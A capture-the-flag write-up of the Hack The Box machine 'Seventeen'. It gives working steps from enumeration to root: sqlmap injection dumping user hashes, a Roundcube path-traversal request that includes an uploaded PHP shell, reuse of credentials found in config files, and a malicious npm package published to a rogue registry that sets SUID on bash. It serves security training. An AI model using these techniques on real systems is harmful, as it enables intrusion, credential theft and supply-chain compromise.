# Seventeen

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.143
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 05:02 EDT
Nmap scan report for 10.129.227.143
Host is up (0.0095s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt
```

Based on normal HTB practice, we can add `seventeen.htb` to our `/etc/hosts` file.&#x20;

### Web Ports -> Subdomain Enum

Port 80 hosts a education based website:

<figure><img src="../../../.gitbook/assets/image (1840).png" alt=""><figcaption></figcaption></figure>

The Github tag there is to the creator's own repository, so there's nothing to investigate there. There isn't much on the website aside from the usual. Let's move on to port 8000.

<figure><img src="../../../.gitbook/assets/image (1817).png" alt=""><figcaption></figcaption></figure>

Perhaps we need to gain access and do port forwarding for this later. For now, we can fuzz for both subdomains and directories within the main website itself.&#x20;

```
$ $ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://seventeen.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://seventeen.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/01 05:06:28 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 312] [--> http://seventeen.htb/css/]
/js                   (Status: 301) [Size: 311] [--> http://seventeen.htb/js/]
/images               (Status: 301) [Size: 315] [--> http://seventeen.htb/images/]
/fonts                (Status: 301) [Size: 314] [--> http://seventeen.htb/fonts/]
/sass                 (Status: 301) [Size: 313] [--> http://seventeen.htb/sass/]
/server-status        (Status: 403) [Size: 278]

$ $ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" --fw 2760 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://seventeen.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.seventeen.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 2760
________________________________________________

exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 18ms]
```

A directory scan reveals nothing, but the subdomain scanner finds an `exam.seventeen.htb` to exist.&#x20;

### Exam Management

The website is hosting some kind of exam reviewer software.

<figure><img src="../../../.gitbook/assets/image (1637).png" alt=""><figcaption></figcaption></figure>

A quick search via `searchsploit` reveals that there are exploits for this software.&#x20;

```
$ searchsploit exam reviewer
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                                                                         | php/webapps/50726.txt
Exam Reviewer Management System 1.0 - ‘id’ SQL Injection                                                                                              | php/webapps/50725.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We could try the RCE one, but we don't have any credentials. As such, we can grab the SQL Injection one first. Following the PoC, we have to run this command:

```bash
sqlmap -u 'http://exam.seventeen.htb?p=take_exam&id=1' -p id --dbs --level 3
available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb
```

Success! This works and we can try to dump the database. Using `sqlmap`, we can slowly enumerate the database:

```
Database: erms_db
[6 tables]
+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+
Table: users
[10 columns]
+--------------+--------------+
| Column       | Type         |
+--------------+--------------+
| avatar       | text         |
| date_added   | datetime     |
| date_updated | datetime     |
| firstname    | varchar(250) |
| id           | int(50)      |
| last_login   | datetime     |
| lastname     | varchar(250) |
| password     | text         |
| type         | tinyint(1)   |
| username     | text         |
+--------------+--------------+
Database: erms_db
Table: users
[3 entries]
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
```

So now we have some password hashes and usernames. However, none of these can be cracked using Crackstation, and `john` didn't manage to work either. In this case, it seems that our RCE won't work because we cannot get the required admin credentials.&#x20;

The most interesting part of this was the `avatar` column, which a directory within `../oldmanagement`. Most of the time, within Linux servers, it is hosted at `/var/www/html`. In this case, because we have an `exam` subdomain, it's probably in `/var/www/exam`. So, the avatars are located within `/var/www/oldmanagement` and might be under the subdomain of  `oldmanagement.seventeen.htb`.&#x20;

### School File Management

When we add the new subdomain to our `/etc/hosts` file and visit it, it brings us to a new login page.

<figure><img src="../../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

Now there's another management system, and we still have SQL Injection within the exam system to find the passwords needed. We can continue to enumerate that database:

```
Database: db_sfms
[3 tables]
+---------+
| user    |
| storage |
| student |
+---------+
Database: db_sfms
Table: user
[6 columns]
+-----------+-------------+
| Column    | Type        |
+-----------+-------------+
| firstname | varchar(45) |
| lastname  | varchar(45) |
| password  | varchar(50) |
| status    | varchar(20) |
| user_id   | int(11)     |
| username  | varchar(20) |
+-----------+-------------+
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| user_id | status        | lastname      | password                         | username         | firstname     |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
+---------+---------------+---------------+----------------------------------+------------------+---------------|
Table: student
[4 entries]
+---------+----+--------+---------+----------+----------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                         | firstname |
+---------+----+--------+---------+----------+----------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233 | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835 | Jamie     |
+---------+----+--------+---------+----------+----------------------------------+-----------+
```

The hashes in the `user` table cannot be cracked. However, the hash for Kelly within the student table can be cracked.

<figure><img src="../../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Using this, we can login to the school system.

<figure><img src="../../../.gitbook/assets/image (1330).png" alt=""><figcaption></figcaption></figure>

Based on the theme of this box, we can search for more exploits regarding the software used here:

```
$ searchsploit school file management
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Landa Driving School Management System 2.0.1 - Arbitrary File Upload                                                                                      | php/webapps/50681.txt
School Event Management System 1.0 - Arbitrary File Upload                                                                                                | php/webapps/45723.txt
School File Management System 1.0 - 'multiple' Stored Cross-Site Scripting                                                                                | php/webapps/49559.txt
School File Management System 1.0 - 'username' SQL Injection                                                                                              | php/webapps/48437.txt
Schools Alert Management Script - Arbitrary File Deletion                                                                                                 | php/webapps/44870.txt
Schools Alert Management Script - Arbitrary File Read                                                                                                     | php/webapps/44874.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

No exploits here do RCE, so let's move past this. As we can see from above, there's a PDF file within the system. We can download it, and when viewed it has this message at the end:

```
Dear Kelly,
Hello! Congratulations on the good grades. Your hard work has paid off! But I do want to point out that you are lacking marks
in Science. All the other subjects are perfectly fine and acceptable. But you do have to work on your knowledge in Science
related areas.
Mr. Sam, your science teacher has mentioned to me that you are lacking in the Physics section specifically. So we thought
maybe we could work on those skills by organizing some extra classes. Some other colleagues of yours have already agreed to this and
are willing to attend the study sessions at night.
Please let Mr. Sam know the exact time when you can participate in the sessions. And he wanted you to know that he won't be active
thorough the socials these days. You can use our new webmail service instead. (https://mastermailer.seventeen.htb/)
Original resource by Seventeen TLC
Thanks,
Mr.StevenBanks
TIC
```

It appears there's another subdomain for an email client at `mastermailer.seventeen.htb`.&#x20;

### Webmail -> RCE

When we visit the new subdomain, we are presented with antoehr login page.

<figure><img src="../../../.gitbook/assets/image (3775).png" alt=""><figcaption></figcaption></figure>

&#x20;A quick inspection on the page source reveals this is using an application called RoundCube.

<figure><img src="../../../.gitbook/assets/image (2950).png" alt=""><figcaption></figcaption></figure>

The page source also tells us this is RoundCube version 1.4.2. When searching for exploits, we can come across this:

{% embed url="https://github.com/advisories/GHSA-j63m-cchh-gcjv" %}

{% embed url="https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube" %}

It seems that we can use directory traversal to execute code via a file we upload. At the same time, the school application allows us to upload files to the machine. So for this case, we need to chain the 2 vulnerabilities together to get RCE.&#x20;

So first, let's determine what kind of files we can upload to the school system. Based on `searchsploit`, it appears that it is a PHP-based website, so let's try to upload a PHP reverse shell. First, we can download the source code from here:

{% embed url="https://www.sourcecodester.com/php/14155/school-file-management-system.html" %}

`download.php` is the code that handles uploads, and here's the contents of it:

```php
<?php
    require_once 'admin/conn.php';
    if(ISSET($_REQUEST['store_id'])){
        $store_id = $_REQUEST['store_id'];

        $query = mysqli_query($conn, "SELECT * FROM `storage` WHERE `store_id` = '$store_id'") or die(mysqli_error());
        $fetch  = mysqli_fetch_array($query);
        $filename = $fetch['filename'];
        $stud_no = $fetch['stud_no'];
        header("Content-Disposition: attachment; filename=".$filename);
        header("Content-Type: application/octet-stream;");
        readfile("files/".$stud_no."/".$filename);
    }
?>
```

We find that it stores the uploads at `/files/<studentID>/uploads`. We can then verify the upload works by uploading a malicious `papers.php`. This name is required based on the PoC requiring our PHP file to have the same name as the directory it is in. This just contains a basic shell executed by PHP `system` calls.&#x20;

<figure><img src="../../../.gitbook/assets/image (1842).png" alt=""><figcaption></figcaption></figure>

Great! However, when I tried the exploit the first time, it wouldn't work for some reason. Turns out, we did not find the right directory where the files are stored. Running a ferox`buster` scan for the upload directory would reveal another one.

<figure><img src="../../../.gitbook/assets/image (2047).png" alt=""><figcaption></figcaption></figure>

The `/papers` directory seems to be where they are stored. After that, we can perform the RCE. Following the PoC, we need to send this POST request via Burp.

```http
POST /mastermailer/installer/index.php HTTP/1.1
Host: mastermailer.seventeen.htb:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Origin: http://mastermailer.seventeen.htb:8000
Connection: close
Referer: http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2
Cookie: roundcube_sessid=0079ef9d79a86aca5a54c76332de69f7; PHPSESSID=a9925c706077e5d6179ed37f9839f323
Upgrade-Insecure-Requests: 1



_step=2&_product_name=Seventeen+Webmail&_plugins_qwerty=../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&submit=UPDATE+CONFIG
```

After sending this, we just need to reload the page and we would catch a reverse shell.

<figure><img src="../../../.gitbook/assets/image (2957).png" alt=""><figcaption></figcaption></figure>

## Docker Breakout

### SSH Credentials

Notice that we are in a Docker container, so we need to find a way to escape. There was another file within the `/var/www/html` folder.

```
www-data@11e1622a6851:/var/www/html/employeemanagementsystem$ ls
aboutus.html       changepassemp.php  index.html       styleapply.css
addemp.php         contact.html       js               styleemplogin.css
adminstyle.css     css                mark.php         styleindex.css
alogin.html        db                 myprofile.php    stylelogin.css
aloginwel.php      delete.php         myprofileup.php  styleprofile.css
applyleave.php     edit.php           process          styleview.css
approve.php        elogin.html        psubmit.php      vendor
assets             eloginwel.php      readme.txt       viewemp.php
assign.php         empleave.php       reset.php
assignproject.php  empproject.php     salaryemp.php
cancel.php         hero-banner.png    style.css
```

Within the `/employeemanagementsystem/process/dbh.php` file, we can find some credentials:

```php
<?php
$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";
$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);
if(!$conn){
        echo "Databese Connection Failed";
}
?>
```

Interesting, however this doesn't work when I try to `su` to `root` on the Docker. Instead, let's take a look at the users present because this might be their SSH password.

The `/home` directory is empty, so let's examine the `/etc/passwd` file to see if we have any users. At the very end, we see a user called `mark`. We can login as the user using this password.

```
$ sshpass -p 2020bestyearofmylife ssh mark@seventeen.htb
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon May  1 10:10:35 UTC 2023

  System load:                    0.57
  Usage of /:                     60.5% of 11.75GB
  Memory usage:                   47%
  Swap usage:                     0%
  Processes:                      364
  Users logged in:                0
  IP address for eth0:            10.129.227.143
  IP address for docker0:         172.17.0.1
  IP address for br-b3834f770aa3: 172.18.0.1
  IP address for br-cc437cf0c6a8: 172.19.0.1
  IP address for br-3539a4850ffa: 172.20.0.1


18 updates can be applied immediately.
12 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon May  1 10:08:46 2023 from 10.10.14.13
mark@seventeen:~$
```

Then, grab the user flag.&#x20;

## Privilege Escalation

### DB-Logger Credentials

Within the `/home` directory, we find another user called `kavi`.

```
mark@seventeen:/home$ ls
kavi  mark
```

Within the user's home directory, there are some hidden directories:

```
mark@seventeen:~$ ls -al
total 36
drwxr-x--- 5 mark mark 4096 May  1 10:14 .
drwxr-xr-x 4 root root 4096 Apr  8  2022 ..
lrwxrwxrwx 1 mark mark    9 Apr 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Apr  8  2022 .bash_logout
-rw-r--r-- 1 mark mark 3771 Apr  8  2022 .bashrc
drwx------ 2 mark mark 4096 Apr  8  2022 .cache
drwx------ 3 mark mark 4096 Apr  8  2022 .gnupg
drwxrwxr-x 2 mark mark 4096 May 31  2022 .npm
-rw-r--r-- 1 mark mark  807 Apr  8  2022 .profile
-rw-r----- 1 root mark   33 May  1 09:01 user.txt
```

There was nothing in them though. I checked `netstat -tulpn` output, and it revealed some hidden ports:

```
mark@seventeen:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:6004          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6006          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6007          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6008          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6009          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:995           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4873          0.0.0.0:*               LISTEN      -                   
tcp        0      0 172.18.0.1:3306         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33003         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:110           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
```

We can check all of them to see what's running. Port 4873 was running another HTTP site based on `curl`.&#x20;

```html
mark@seventeen:~$ curl localhost:4873
    <!DOCTYPE html>
      <html lang="en-us"> 
      <head>
        <meta charset="utf-8">
        <base href="http://localhost:4873/">
        <title>Verdaccio</title>        
        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" /> 
        <script>
            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
        </script>
        
      </head>    
      <body class="body">
      
        <div id="root"></div>
        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>
        
      </body>
    </html>
```

As such, we can do some port forwarding using `ssh`. Viewing it reveals some sort of pacakage manager for NPM.

<figure><img src="../../../.gitbook/assets/image (3655).png" alt=""><figcaption></figcaption></figure>

Within the `/opt/app` directory, there's a `startup.sh` script:

```bash
mark@seventeen:/opt/app$ cat startup.sh 
#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep --silent
        /bin/chown root:root node_modules -R
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js
```

This seems to check for the `db-logger` and `loglevel` NPM modules, and then runs an application using them I presume. Also, I found some mail for the `kavi` user in `/var/mail`:

{% code overflow="wrap" %}
```
mark@seventeen:/var/mail$ cat kavi
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike
```
{% endcode %}

"Private registry" and "old logger" are probably referring to the website on port 4873 and the `db-logger` module. We can try to install the `db-logger` module from that website using this command:

```
mark@seventeen:~$ npm install db-logger --registry http://127.0.0.1:4873
/home/mark
└─┬ db-logger@1.0.1 
  └─┬ mysql@2.18.1 
    ├── bignumber.js@9.0.0 
    ├─┬ readable-stream@2.3.7 
    │ ├── core-util-is@1.0.3 
    │ ├── inherits@2.0.4 
    │ ├── isarray@1.0.0 
    │ ├── process-nextick-args@2.0.1 
    │ ├── string_decoder@1.1.1 
    │ └── util-deprecate@1.0.2 
    ├── safe-buffer@5.1.2 
    └── sqlstring@2.3.1 

npm WARN enoent ENOENT: no such file or directory, open '/home/mark/package.json'
npm WARN mark No description
npm WARN mark No repository field.
npm WARN mark No README data
npm WARN mark No license field.
```

When we view the files, we see this:

```
mark@seventeen:~/node_modules/db-logger$ cat logger.js 
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

function log(msg) {
    con.connect(function(err) {
        if (err) throw err;
        var date = Date();
        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
        con.query(sql, function (err, result) {
        if (err) throw err;
        console.log("[+] Logged");
        });
    });
};

module.exports.log = log
```

We can use that password to `su` to `kavi`.&#x20;

### NPM Module RCE

This user has `sudo` privileges to run the `startup.sh` script.

```
kavi@seventeen:~$ sudo -l
[sudo] password for kavi: 
Matching Defaults entries for kavi on seventeen:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh
```

I already included the contents of the script above, but basically it checks for two modules `db-logger` and `loglevel`, and installs them if they are not present. So to exploit this, we probably need to run this as `root` and get the machine to install a module for RCE.&#x20;

Within that directory, we can also see an `index.js` file that calls for uses the `loglevel` module:

```javascript
kavi@seventeen:/opt/app$ cat index.js
const http = require('http')
const port = 8000
const fs = require('fs')
//var logger = require('db-logger')
var logger = require('loglevel')

const server = http.createServer(function(req, res) {
    res.writeHead(200, {'Content-Type': 'text/html'})
    fs.readFile('index.html', function(error, data){
        if (error) {
            res.writeHead(404)
            res.write('Error: File Not Found')
            logger.debug(`INFO: Reuqest from ${req.connection.remoteAddress} to /`)

        } else {
            res.write(data)
        }
    res.end()
    })
})

server.listen(port, function(error) {
    if (error) {
        logger.warn(`ERROR: Error occured while starting the server : ${e}`)
    } else {
        logger.log("INFO:  Server running on port " + port)
    }
})
```

Take note that this `index.js` is run right after the modules are downloaded using `startup.sh`, so that's where our module is loaded and we can execute code as `root`.&#x20;

First, let's create the `logger.js` file:

```javascript
const cp = require("child_process")

cp.exec("chmod u+s /bin/bash");

function log(msg) {
    console.log(msg);
}
function debug(msg) {
    console.log(msg);
}
function warn(msg) {
    console.log(msg);
}
module.exports.log = log;
```

I added some dummy functions in order to make sure the application does not crash when we run it since `index.js` calls those functions from the module. Then, we can create a package based on this.

```
$ npm init
This utility will walk you through creating a package.json file.
It only covers the most common items, and tries to guess sensible defaults.

See `npm help init` for definitive documentation on these fields
and exactly what they do.

Use `npm install <pkg>` afterwards to install a package and
save it as a dependency in the package.json file.

Press ^C at any time to quit.
package name: (loglevel) 
version: 2.5.0 
description: 
entry point: (logger.js) 
test command: 
git repository: 
keywords: 
author: kavigihan
license: (ISC) 
About to write to /home/kali/htb/seventeen/loglevel/package.json:

{
  "name": "loglevel",
  "version": "2.5.0",
  "description": "",
  "main": "logger.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "kavigihan",
  "license": "ISC"
}


Is this OK? (yes)
```

Now, we need to edit the `.npmrc` file that specifies where the registry is. This is located within `kavi` home directory

```
kavi@seventeen:~$ cat .npmrc 
registry=http://127.0.0.1:4873/
```

Edit this to point to our host on the same port. Now, we need to host the Verdaccio instance.&#x20;

```bash
sudo npm install -g verdaccio
verdaccio -l 10.10.14.13:4873
```

Then, we need to publish the module there:

```
$ npm adduser --registry http://10.10.14.13:4873
npm WARN adduser `adduser` will be split into `login` and `register` in a future version. `adduser` will become an alias of `register`. `login` (currently an alias) will become its own command.
npm notice Log in on http://10.10.14.13:4873/
Username: innocent
Password: 
Email: (this IS public) test@test.com
Logged in as innocent on http://10.10.14.13:4873/.

$ npm publish --registry http://10.10.14.13:4873
npm notice 
npm notice 📦  loglevel@2.5.0
npm notice === Tarball Contents === 
npm notice 661B logger.js   
npm notice 214B package.json
npm notice === Tarball Details === 
npm notice name:          loglevel                                
npm notice version:       2.5.0                                   
npm notice filename:      loglevel-2.5.0.tgz                      
npm notice package size:  731 B                                   
npm notice unpacked size: 875 B                                   
npm notice shasum:        9f06ae68f72bcb4943e458fd9f43ff14c7911532
npm notice integrity:     sha512-V5P79I0gN2yve[...]4rVKlTmEBbVdA==
npm notice total files:   2                                       
npm notice 
npm notice Publishing to http://10.10.14.13:4873/
+ loglevel@2.5.0
```

Afterwards, simply run the `startup.sh` script.

```
kavi@seventeen:/opt/app$ sudo /opt/app/startup.sh
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
/opt/app
├── loglevel@2.5.0 
└── mysql@2.18.1 

[+] Starting the app
INFO:  Server running on port 8000
```

Now that the application is running, it means that the module is loaded and our command has been executed and we can get an easy `root` shell.

<figure><img src="../../../.gitbook/assets/image (3004).png" alt=""><figcaption></figcaption></figure>

Rooted!
